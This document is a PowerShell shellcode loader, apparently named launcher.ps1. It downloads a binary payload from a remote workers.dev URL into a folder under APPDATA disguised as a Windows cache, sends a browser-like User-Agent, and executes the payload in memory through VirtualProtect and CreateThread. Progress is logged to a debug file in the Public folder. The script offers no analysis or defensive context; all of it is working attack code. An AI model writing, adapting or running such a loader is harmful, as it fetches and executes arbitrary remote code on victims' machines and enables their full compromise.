# === DEBUG LOGGING ===
"launcher.ps1 started" | Out-File "C:\Users\Public\debug.txt" -Append

try {
    # === SETUP ===
    $envData = Get-Item env:APPDATA
    $cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
    if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}
    
    # === DOWNLOAD SHELLCODE ===
    $shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode"
    $shellcodePath = Join-Path $cachePath "payload.bin"
    
    "Downloading shellcode from: $shellcodeUrl" | Out-File "C:\Users\Public\debug.txt" -Append
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($shellcodeUrl, $shellcodePath)
    
    # === VERIFY DOWNLOAD ===
    if (Test-Path $shellcodePath) {
        $fileSize = (Get-Item $shellcodePath).Length
        "Download OK - File size: $fileSize bytes" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # === INJECT SHELLCODE ===
        "Starting shellcode injection" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # Native methods for injection
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@
        
        $shellcodeBytes = [System.IO.File]::ReadAllBytes($shellcodePath)
        "Shellcode loaded: $($shellcodeBytes.Length) bytes" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # Allocate memory
        $memAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcodeBytes.Length)
        "Memory allocated at: 0x$($memAddress.ToString('X16'))" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # Copy shellcode
        [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $memAddress, $shellcodeBytes.Length)
        "Shellcode copied to memory" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # Change protection to RX
        $oldProtect = 0
        $result = [NativeMethods]::VirtualProtect($memAddress, [UInt32]$shellcodeBytes.Length, 0x20, [Ref]$oldProtect)
        if (-not $result) {
            "ERROR: VirtualProtect failed" | Out-File "C:\Users\Public\debug.txt" -Append
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
            return
        }
        "Memory protection changed to RX" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # Create thread
        $threadId = 0
        $threadHandle = [NativeMethods]::CreateThread(0, 0, $memAddress, [IntPtr]::Zero, 0, [Ref]$threadId)
        if ($threadHandle -eq [IntPtr]::Zero) {
            "ERROR: CreateThread failed" | Out-File "C:\Users\Public\debug.txt" -Append
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
            return
        }
        "Thread created with ID: $threadId" | Out-File "C:\Users\Public\debug.txt" -Append
        "Shellcode execution initiated" | Out-File "C:\Users\Public\debug.txt" -Append
        
        # Brief wait to ensure thread starts
        Start-Sleep -Milliseconds 100
        "launcher.ps1 completed successfully" | Out-File "C:\Users\Public\debug.txt" -Append
    } else {
        "ERROR: Shellcode file not found after download" | Out-File "C:\Users\Public\debug.txt" -Append
    }
}
catch {
    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\debug.txt" -Append
}
